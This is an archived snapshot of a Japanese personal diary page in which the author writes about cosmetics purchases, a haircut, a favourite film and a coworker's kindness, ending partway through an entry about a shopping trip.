<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<META name="GENERATOR" content="IBM HomePage Builder 2001 V5.0.2 for Windows">
<TITLE></TITLE>
</HEAD>
<BODY bgcolor="#000000" text="#ccffcc" link="#cc6666" vlink="#999999" alink="#cccc99">
<!-- BEGIN WAYBACK TOOLBAR INSERT -->

<script type="text/javascript" src="http://staticweb.archive.org/js/disclaim-element.js" ></script>
<script type="text/javascript" src="http://staticweb.archive.org/js/graph-calc.js" ></script>
<script type="text/javascript" src="http://staticweb.archive.org/jflot/jquery.min.js" ></script>
<script type="text/javascript">
//<![CDATA[
var firstDate = 820454400000;
var lastDate = 1325375999999;
var wbPrefix = "http://web.archive.org/web/";
var wbCurrentUrl = "http:\/\/ww2.tiki.ne.jp\/~die-\/d-nikki3.htm";

var curYear = -1;
var curMonth = -1;
var yearCount = 16;
var firstYear = 1996;
var imgWidth=400;
var yearImgWidth = 25;
var monthImgWidth = 2;
var trackerVal = "none";
var displayDay = "22";
var displayMonth = "Jan";
var displayYear = "2005";
var prettyMonths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];

function showTrackers(val) {
	if(val == trackerVal) {
		return;
	}
	if(val == "inline") {
		document.getElementById("displayYearEl").style.color = "#ec008c";
		document.getElementById("displayMonthEl").style.color = "#ec008c";
		document.getElementById("displayDayEl").style.color = "#ec008c";		
	} else {
		document.getElementById("displayYearEl").innerHTML = displayYear;
		document.getElementById("displayYearEl").style.color = "#ff0";
		document.getElementById("displayMonthEl").innerHTML = displayMonth;
		document.getElementById("displayMonthEl").style.color = "#ff0";
		document.getElementById("displayDayEl").innerHTML = displayDay;
		document.getElementById("displayDayEl").style.color = "#ff0";
	}
   document.getElementById("wbMouseTrackYearImg").style.display = val;
   document.getElementById("wbMouseTrackMonthImg").style.display = val;
   trackerVal = val;
}
function getElementX2(obj) {
	var thing = jQuery(obj);
	if((thing == undefined) 
			|| (typeof thing == "undefined") 
			|| (typeof thing.offset == "undefined")) {
		return getElementX(obj);
	}
	return Math.round(thing.offset().left);
}
function trackMouseMove(event,element) {

   var eventX = getEventX(event);
   var elementX = getElementX2(element);
   var xOff = eventX - elementX;
	if(xOff < 0) {
		xOff = 0;
	} else if(xOff > imgWidth) {
		xOff = imgWidth;
	}
   var monthOff = xOff % yearImgWidth;

   var year = Math.floor(xOff / yearImgWidth);
	var yearStart = year * yearImgWidth;
   var monthOfYear = Math.floor(monthOff / monthImgWidth);
   if(monthOfYear > 11) {
       monthOfYear = 11;
   }
   // 1 extra border pixel at the left edge of the year:
   var month = (year * 12) + monthOfYear;
   var day = 1;
	if(monthOff % 2 == 1) {
		day = 15;
	}
	var dateString = 
		zeroPad(year + firstYear) + 
		zeroPad(monthOfYear+1,2) +
		zeroPad(day,2) + "000000";

	var monthString = prettyMonths[monthOfYear];
	document.getElementById("displayYearEl").innerHTML = year + 1996;
	document.getElementById("displayMonthEl").innerHTML = monthString;
	// looks too jarring when it changes..
	//document.getElementById("displayDayEl").innerHTML = zeroPad(day,2);

	var url = wbPrefix + dateString + '/' +  wbCurrentUrl;
	document.getElementById('wm-graph-anchor').href = url;

   //document.getElementById("wmtbURL").value="evX("+eventX+") elX("+elementX+") xO("+xOff+") y("+year+") m("+month+") monthOff("+monthOff+") DS("+dateString+") Moy("+monthOfYear+") ms("+monthString+")";
   if(curYear != year) {
       var yrOff = year * yearImgWidth;
       document.getElementById("wbMouseTrackYearImg").style.left = yrOff + "px";
       curYear = year;
   }
   if(curMonth != month) {
       var mtOff = year + (month * monthImgWidth) + 1;
       document.getElementById("wbMouseTrackMonthImg").style.left = mtOff + "px";
       curMonth = month;
   }
}
//]]>
</script>

<style type="text/css">body{margin-top:0!important;padding-top:0!important;min-width:800px!important;}#wm-ipp a:hover{text-decoration:underline!important;}</style>
<div id="wm-ipp" style="display:none; position:relative;padding:0 5px;min-height:70px;min-width:800px; z-index:9000;">
<div id="wm-ipp-inside" style="position:fixed;padding:0!important;margin:0!important;width:97%;min-width:780px;border:5px solid #000;border-top:none;background-image:url(http://staticweb.archive.org/images/toolbar/wm_tb_bk_trns.png);text-align:center;-moz-box-shadow:1px 1px 3px #333;-webkit-box-shadow:1px 1px 3px #333;box-shadow:1px 1px 3px #333;font-size:11px!important;font-family:'Lucida Grande','Arial',sans-serif!important;">
   <table style="border-collapse:collapse;margin:0;padding:0;width:100%;"><tbody><tr>
   <td style="padding:10px;vertical-align:top;min-width:110px;">
   <a href="http://wayback.archive.org/web/" title="Wayback Machine home page" style="background-color:transparent;border:none;"><img src="http://staticweb.archive.org/images/toolbar/wayback-toolbar-logo.png" alt="Wayback Machine" width="110" height="39" border="0"/></a>
   </td>
   <td style="padding:0!important;text-align:center;vertical-align:top;width:100%;">

       <table style="border-collapse:collapse;margin:0 auto;padding:0;width:570px;"><tbody><tr>
       <td style="padding:3px 0;" colspan="2">
       <form target="_top" method="get" action="http://wayback.archive.org/web/form-submit.jsp" name="wmtb" id="wmtb" style="margin:0!important;padding:0!important;"><input type="text" name="url" id="wmtbURL" value="http://ww2.tiki.ne.jp/~die-/d-nikki3.htm" style="width:400px;font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;" onfocus="javascript:this.focus();this.select();" /><input type="hidden" name="type" value="replay" /><input type="hidden" name="date" value="20050122190912" /><input type="submit" value="Go" style="font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;margin-left:5px;" /><span id="wm_tb_options" style="display:block;"></span></form>
       </td>
       <td style="vertical-align:bottom;padding:5px 0 0 0!important;" rowspan="2">
           <table style="border-collapse:collapse;width:110px;color:#99a;font-family:'Helvetica','Lucida Grande','Arial',sans-serif;"><tbody>
			
           <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
           <tr style="width:110px;height:16px;font-size:10px!important;">
           	<td style="padding-right:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="http://web.archive.org/web/20041106194305/http://ww2.tiki.ne.jp/~die-/d-nikki3.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="6 Nov 2004"><strong>NOV</strong></a>
		                
               </td>
               <td id="displayMonthEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight:bold;text-transform:uppercase;width:34px;height:15px;padding-top:1px;text-align:center;" title="You are here: 19:09:12 Jan 22, 2005">JAN</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       Feb
                       
               </td>
           </tr>

           <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
           <tr>
               <td style="padding-right:9px;white-space:nowrap;overflow:visible;text-align:right!important;vertical-align:middle!important;" nowrap="nowrap">
               
		                <a href="http://web.archive.org/web/20041106194305/http://ww2.tiki.ne.jp/~die-/d-nikki3.htm" title="19:43:05 Nov 6, 2004" style="background-color:transparent;border:none;"><img src="http://staticweb.archive.org/images/toolbar/wm_tb_prv_on.png" alt="Previous capture" width="14" height="16" border="0" /></a>
		                
               </td>
               <td id="displayDayEl" style="background:#000;color:#ff0;width:34px;height:24px;padding:2px 0 0 0;text-align:center;font-size:24px;font-weight: bold;" title="You are here: 19:09:12 Jan 22, 2005">22</td>
				<td style="padding-left:9px;white-space:nowrap;overflow:visible;text-align:left!important;vertical-align:middle!important;" nowrap="nowrap">
               
                       <img src="http://staticweb.archive.org/images/toolbar/wm_tb_nxt_off.png" alt="Next capture" width="14" height="16" border="0"/>
                       
			    </td>
           </tr>

           <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
           <tr style="width:110px;height:13px;font-size:9px!important;">
				<td style="padding-right:9px;font-size:11px!important;font-weight: bold;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="http://web.archive.org/web/20031230231131/http://ww2.tiki.ne.jp/~die-/d-nikki3.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="30 Dec 2003"><strong>2003</strong></a>
		                
               </td>
               <td id="displayYearEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight: bold;padding-top:1px;width:34px;height:13px;text-align:center;" title="You are here: 19:09:12 Jan 22, 2005">2005</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight: bold;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       2006
                       
				</td>
           </tr>
           </tbody></table>
       </td>

       </tr>
       <tr>
       <td style="vertical-align:middle;padding:0!important;">
           <a href="http://wayback.archive.org/web/20050122190912*/http://ww2.tiki.ne.jp/~die-/d-nikki3.htm" style="color:#33f;font-size:11px;font-weight:bold;background-color:transparent;border:none;" title="See a list of every capture for this URL"><strong>8 captures</strong></a>
           <div style="margin:0!important;padding:0!important;color:#666;font-size:9px;padding-top:2px!important;white-space:nowrap;" title="Timespan for captures of this URL">23 Apr 03 - 22 Jan 05</div>
       </td>
       <td style="padding:0!important;">
       <a style="position:relative; white-space:nowrap; width:400px;height:27px;" href="" id="wm-graph-anchor">
       <div id="wm-ipp-sparkline" style="position:relative; white-space:nowrap; width:400px;height:27px;background-color:#fff;cursor:pointer;border-right:1px solid #ccc;" title="Explore captures for this URL">
			<img id="sparklineImgId" style="position:absolute; z-index:9012; top:0px; left:0px;"
				onmouseover="showTrackers('inline');" 
				onmouseout="showTrackers('none');"
				onmousemove="trackMouseMove(event,this)"
				alt="sparklines"
				width="400"
				height="27"
				border="0"
				src="http://wayback.archive.org/jsp/graph.jsp?graphdata=400_27_1996:-1:000000000000_1997:-1:000000000000_1998:-1:000000000000_1999:-1:000000000000_2000:-1:000000000000_2001:-1:000000000000_2002:-1:000000000000_2003:-1:000100010001_2004:-1:001010100010_2005:0:100000000000_2006:-1:000000000000_2007:-1:000000000000_2008:-1:000000000000_2009:-1:000000000000_2010:-1:000000000000_2011:-1:000000000000"></img>
			<img id="wbMouseTrackYearImg" 
				style="display:none; position:absolute; z-index:9010;"
				width="25" 
				height="27"
				border="0"
				src="http://staticweb.archive.org/images/toolbar/transp-yellow-pixel.png"></img>
			<img id="wbMouseTrackMonthImg"
				style="display:none; position:absolute; z-index:9011; " 
				width="2"
				height="27" 
				border="0"
				src="http://staticweb.archive.org/images/toolbar/transp-red-pixel.png"></img>
       </div>
		</a>

       </td>
       </tr></tbody></table>
   </td>
   <td style="text-align:right;padding:5px;width:65px;font-size:11px!important;">
       <a href="javascript:;" onclick="document.getElementById('wm-ipp').style.display='none';" style="display:block;padding-right:18px;background:url(http://staticweb.archive.org/images/toolbar/wm_tb_close.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;margin-bottom:23px;background-color:transparent;border:none;" title="Close the toolbar">Close</a>
       <a href="http://faq.web.archive.org/" style="display:block;padding-right:18px;background:url(http://staticweb.archive.org/images/toolbar/wm_tb_help.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;background-color:transparent;border:none;" title="Get some help using the Wayback Machine">Help</a>
   </td>
   </tr></tbody></table>

</div>
</div>
<script type="text/javascript">
 var wmDisclaimBanner = document.getElementById("wm-ipp");
 if(wmDisclaimBanner != null) {
   disclaimElement(wmDisclaimBanner);
 }
</script>
<!-- END WAYBACK TOOLBAR INSERT -->

<P><BR><BR>
</P>
<P>　　<A href="http://web.archive.org/web/20050122190912/http://ww2.tiki.ne.jp/~die-/d-nikkitop.htm">ＴＯＰへ</A><BR><BR><BR></P>
<TABLE>
  <TBODY>
    <TR>
      <TD width="719">●　１２月１９日　●　その後</TD>
      <TD></TD>
    </TR>
    <TR>
      <TD width="719" height="25"></TD>
      <TD height="25"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1213">
  <TBODY>
    <TR>
      <TD width="19"></TD>
      <TD width="1178">遅ればせながら『テニスの王子様』にハマりました。案の定・・・</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1178">アーティストは山崎まさよし、モデルは富永愛、コスメはゲラン、デコルテ、ボビィ・ブラウンと無節操に手を出してます。</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1178">ボビィの限定アイパレット！初回発売時、空前の大ヒットで当日昼には完売、ネット上でも売切れの嵐で</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1178">当然のように買い逃した私でしたが、追加販売の時に会社を抜け出しやっと手に入れました！</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1178">限定ものは２個買いたくなりませんか・・・。一つは日常使いでもう一つは大事にしまっておこうと・・。</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1178">しかしデコルテ同様、値が高いので一つしか買いませんでしたが。</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1178">ヌーディが売りの商品ですが、まさにその通りの土色顔の具合悪そうな仕上りとなりました！ヤバイ！</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>塗りすぎなのでしょうか、今はなるべくうっすらとつけているのかどうなのか判らないくらいのニュアンスに</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>留めています。ヌーディメイクって憧れるけど、難しいのですね〜失敗失敗、２個買わなくて良かった！です。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>まだ下記デコルテのアイシャドーもたんまり残ってるのにどうして私は次から次へと新たなものへ挑戦してしまうのっ</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>まあ、美への執着と羨望、飽くなき追求としておきましょう。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>コスメにはいくらでも金を使ってしまうと思われます。楽しいから。女で良かったｖ</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE>
  <TBODY>
    <TR>
      <TD width="748">●　９月１８日　●　君島さん</TD>
    </TR>
    <TR>
      <TD width="748" height="30"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1192">
  <TBODY>
    <TR>
      <TD width="19"></TD>
      <TD width="1157">買っちゃった・・・君島十和子さんカラーのコスメデコルテアイシャドー、</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1157">「シャドウイントゥイス」２０番！５，５００円ナリ〜・・ああ、なんでそんなに高いのでしょう。</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1157">でも確かに上品です。お粉がヒタっとフィットするさまはおさすが！朝つけてアイシャドーはもうお直しはしません。</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1157">すごいです、この威力。デコルテファンの皆さんが口を揃えて『持っていて損はないヨ』とおっしゃるだけあります。</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1157">デコルテのカウンターでおねいさんがついでに秋冬用ファンデのサンプルくれまして、次の日それをつけて</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1157">出勤しましたところ、なぜか顔がくすみました・・毛穴落ちもすごかったですし。</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1157">デコルテは今のところアイシャドーのみ！ファンデは明日（９／１９）発売のソニア・リキエルのクリームファンデを</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1157">購入予定。ちなみに今一番欲しい香水は「ドリーミング・プリンセス」。故ダイアナ妃をイメージして造られた香水で</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1157">なんとも甘く可愛らしい香り！プリンセスモード全開ですねー！</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="758">
  <TBODY>
    <TR>
      <TD>●　８月３日　●　美容院</TD>
    </TR>
    <TR>
      <TD height="33"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1181">
  <TBODY>
    <TR>
      <TD width="17"></TD>
      <TD width="1148">髪を切りました。肩より少し長めに伸びていたのですが、この梅雨明けした真夏の日差しや湿気に</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1148">このヘアスタイルはつらすぎました。中途半端過ぎてアップしてもパラパラ落ちてくるし、</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1148">だからといってそのままだとべっとり首に纏わりつくので思い切って近くの美容院に行きました。</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1148">何事も初めて入る店というのは緊張するもの。いざ足を踏み入れるとなんだか男性客ばかり。</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1148">あれ？オシャレな外観だったけど、もしかしてここ理容店？と躊躇していると細身のパンクなお兄さんが</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1148">すかさずやってきて案内してくれました。実はそこは開店２０年の歴史を持つ理容店本店で３年前から</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1148">美容師を入れて美容店としても発足したお店だったのです。理容師がいるところは腕に自信があるところ、と</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>変な思い込みがある私は安心して担当のおねいさんにお任せしたところ・・・</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>なんだかんだで二万円も取られてしまいました！！キャーっつ！！・・て自分が望んだ髪型だからいいのですが、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>やはり縮毛矯正はくせ毛の救世主ですから、このお値段でもしかたありません。ああ、これまで以上に貧困の日々・・。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>問題の髪型はまあまあお気に入り。なんだか幼くなりました。「ＯＮＥ　ＰＩＥＣＥ」のナミみたいな髪型になってしまいました。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="758">
  <TBODY>
    <TR>
      <TD>●　７月２９日　●　バーズの威厳</TD>
    </TR>
    <TR>
      <TD height="27"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1155">
  <TBODY>
    <TR>
      <TD width="17"></TD>
      <TD width="1122">シャネル・・。私はあまりシャネルに心惹かれないので、品はほとんどお土産でもらうものくらいですが、</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1122">最近唯一自分で購入したシャネルブランドが『イドゥラバーズ』という口紅です。</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1122">先日友人が使っていた口紅が偏光パールで大人のカワイコちゃん風でしたので拝借してみたのが</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1122">きっかけでした。・・が、臭っつ！！にがっつ！！まずっつ！！</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1122">鼻を直撃する異臭、食欲もとんと失せる苦い味、学生の頃生物の先生が口紅はアスファルトと同じ成分で</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1122">出来ていると言った遠い昔の記憶を呼び覚ますほど身体に悪そうな嫌な味が舌に長く残るこの口紅。</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1122">世のお嬢さん方はこの異臭と味を我慢していらっしゃるの？それとも慣れてしまうの？それとも鈍感なの？</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>と思いつつも友人の口紅を丸一日つけたままにしていると案外臭いは消えてしまうもので、味以外は</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>平気になりました。そんなわけで次の日早速購入しました『イドゥラバーズ』の６４番！</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>あの嶋田ちあきさんも大絶賛のシルバーパールのピンクです。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ピンクが思ったほど派手ではなくて、シルバーパールも嫌味ではありません。邪魔していない。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>でも次は秋の新色、会社でもつけていけそうなピンクベージュ２７番ベイビーゴールドを購入予定です！</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="755">
  <TBODY>
    <TR>
      <TD>●　７月９日　●　戦慄のグリーン</TD>
    </TR>
    <TR>
      <TD height="30"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1157">
  <TBODY>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">先日Ｍ・Ａ・Ｃのアイライナーを購入しました。お値段２，２００円。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">アイライナーごときに２千円以上出すなんてと思いきや、他のブランドは平気で３千円代をいってるんですね。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">私が購入いたしましたのは「フォーエバーグリーン」という何とも重い名を持つ新作のウォータープルーフです。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">売り場のおねいさんにすすめられ、お試しさせてもらいましたが、これがまたまた絶妙ヒット。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">一度塗ると夕方までとれない落ちないにじまないその底力はまさにフォーエバー！</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">派手な色ではないので会社にもバンバンつけていってます。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">芯が柔らかくてフィットしやすいけれど、ちっと太くてなかなか上手く描けないのが難点ですか。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">売り場のおねいさんもとっても親切で優しい女性でしたのでＭ・Ａ・Ｃが好きになってきました。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">次は新作の口紅を購入予定です。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="757">
  <TBODY>
    <TR>
      <TD>●　７月８日　●　アホアホダンス</TD>
    </TR>
    <TR>
      <TD height="33"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1157">
  <TBODY>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">チャーミング！！まさにその言葉がピッタリはまる『チャーリーズ・エンジェル』でのキャメロン・ディアス！</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">他の作品での演技を知らないのですが、先日ＴＶで放映されたこの映画を観て一発でファンになりました。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">ちょっとおバカで明るく天然でミョーな雑学に詳しい女性を演じる彼女は三人の中で一番輝いて見えました。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">ある雑誌で「パンツ一丁でアホアホダンスを踊って、さまになるのはキャメロンだからこそ」と賞賛（？）されて</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">いましたが、それは本当です。あのお尻ふりふりシーンは可愛さ絶頂！</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">絶対『フルスロットル』も観にいかねば、と心に誓いました。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">日本語吹き替えでしたので彼女の地声は知りませんが、でも吹き替えの声優さんも見事です。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">知らない声優さんでしたが、キャメロン・ディアスの終始ハイテンポな魅力を絶妙に引き出されていました。</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129">ああ、早く映画館で続きを見たいです！</TD>
    </TR>
    <TR>
      <TD width="12"></TD>
      <TD width="1129"></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="754">
  <TBODY>
    <TR>
      <TD>●　６月１３日　●　他人の思いやり</TD>
    </TR>
    <TR>
      <TD height="27"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1163">
  <TBODY>
    <TR>
      <TD width="16"></TD>
      <TD width="1131">他人の思いやりというものをしみじみと感じる出来事がありました。</TD>
    </TR>
    <TR>
      <TD width="16"></TD>
      <TD width="1131">『紙一重のエリック』。思った事を何でも口にする裏表の無い会社での私の上司ですが、言わなくても良い事も</TD>
    </TR>
    <TR>
      <TD width="16"></TD>
      <TD width="1131">包み隠さず言ってしまうので敵の多い人です。ある日私はそのエリックと壮絶な口論をしました。</TD>
    </TR>
    <TR>
      <TD width="16"></TD>
      <TD width="1131">原因を述べると非常に長くなるので省きますが、エリックは誰に対しても態度を変えないので</TD>
    </TR>
    <TR>
      <TD width="16"></TD>
      <TD width="1131">私が女だろうと自分の愛娘と同じ歳頃だろうと怒ると容赦が無く、私達の口論を他の上司や同僚は</TD>
    </TR>
    <TR>
      <TD width="16"></TD>
      <TD width="1131">目を点にして見ていたようでした。私はその場では怒りで何も考えられず帰宅したのですが、</TD>
    </TR>
    <TR>
      <TD width="16"></TD>
      <TD width="1131">一人アパートに戻るとぶわっと涙が溢れて久しぶりに号泣しました。</TD>
    </TR>
    <TR>
      <TD width="16"></TD>
      <TD width="1131">次の日、嫌な気分で会社に行くと、周りの人がやけに優しい声をかけてくれ、私に気を使ってくれているようでしたが</TD>
    </TR>
    <TR>
      <TD width="16"></TD>
      <TD width="1131">エリックとは朝の挨拶をした以外互いに話をしようとしませんでした。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>険悪な雰囲気のまま仕事をしていると他の島（同じ部だけど机の列が違う）の上司『微笑みのイワン』が</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「ダイさん、今からお客さんとこ行くけど一緒に行かんね」と行って何故だか私を連れて外回りに出ました。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>私には全く経験のないお客様回り。私はイワンの足手まといになるのではと心配になりましたが</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>イワンは一緒に話を聞いてるだけでいいよ、とそれぞれの資料を私に手渡して、ちょっとした秘書のような</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>役割でその日共に行動しました。イワンは移動中の車の中で前日の口論について聞く事はなく、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>家族の話や禁煙中の苦難の話、学生時代の話など取りとめのない話を続けて私を笑わせてくれたのでした。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>この日ほど心から人に対して感謝の気持ちでいっぱいになったことはありません。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>私に気分転換の為に外へ連れ出してくれたイワン、心配して声を掛けてくれた周りの同僚に</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>思いやりというものを再確認させてもらえました。エリックにはきちんと謝ろうという気持ちも出て、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>なんとなく自分も優しくなれる、そんな経験でした。・・それにしてもイワンの隣で資料を手渡すだけの役目で</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>色んなところへ行って、行く先々でお茶ゴチになって・・良い一日でしたなぁ・・。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR><BR>
</P>
<TABLE width="755">
  <TBODY>
    <TR>
      <TD>●　６月８日　●　グロス来襲</TD>
    </TR>
    <TR>
      <TD height="32"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1146">
  <TBODY>
    <TR>
      <TD width="17"></TD>
      <TD width="1113">グロス・・・私はあまりグロスに興味を持つ方ではなかったのです。ベタベタするし、</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1113">持ちが悪いし、会社には塗っていけないし、で断然口紅オンリーだったのですが</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1113">ある日友人の艶やかな唇を見てグロスの女力上昇力にあっさり心惹かれてしまいました。</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1113">早速雑誌をあさると５月末に限定発売されたシャネルのグロス「レーヴルサンティヤント」の</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1113">４１番が大プッシュされており、その日の内に下見に行きました。薄いシャーベットのようなピンクで</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1113">可愛らしいですがちっと色が薄すぎるかな？と思い購入には至らず、隣のディオールで同じく</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="1113">ピンクのグロスをお試しするもこれもラメがきつすぎて購入は見送り。なかなかぴったりくるものが</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>無いもんだと思っていると、ある日ネットでエレガンスのパーフェクトグロスが大絶賛されているのを</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>発見。次の日ショップでお試しにつぐお試し。何度も通ってうざいほど迷って本日ようやっと</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>購入しました。０６番のローズ系可愛い大人色に決定！３５００円と口紅より高いやんけ！と</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>何度も躊躇しましたが買って良かったです・・がこれでアナスイのドーリーガールはお預けですわ・・</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="756">
  <TBODY>
    <TR>
      <TD>●　５月２４日　●　休日の過ごし方</TD>
    </TR>
    <TR>
      <TD height="26"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1140">
  <TBODY>
    <TR>
      <TD width="23"></TD>
      <TD width="1101">親友・ミラーちゃんとお買い物三昧。ミラーちゃんはセブンのジーンズ（１万９千円）をかなり迷いつつも</TD>
    </TR>
    <TR>
      <TD width="23"></TD>
      <TD width="1101">カードでお買い上げ。セブンは誰がはいてもとってもスマートに見えてさすがお値段だけはある代物です。</TD>
    </TR>
    <TR>
      <TD width="23"></TD>
      <TD width="1101">彼女がかなり迷いながら何度も試着を繰り返す間に私は隣の店に何気なく歩みよると『トッカ』という</TD>
    </TR>
    <TR>
      <TD width="23"></TD>
      <TD width="1101">ブランドの展示会らしき所がありました。知らないブランドでしたがそのワンピースの鮮やかな色合いや</TD>
    </TR>
    <TR>
      <TD width="23"></TD>
      <TD width="1101">刺繍の細かさが実に美しい商品でした。シーズン毎に素材や色の違うワンピを発表するのがこのブランドの</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>コンセプトらしいのです。こだわりがありますね。</TD>
    </TR>
    <TR>
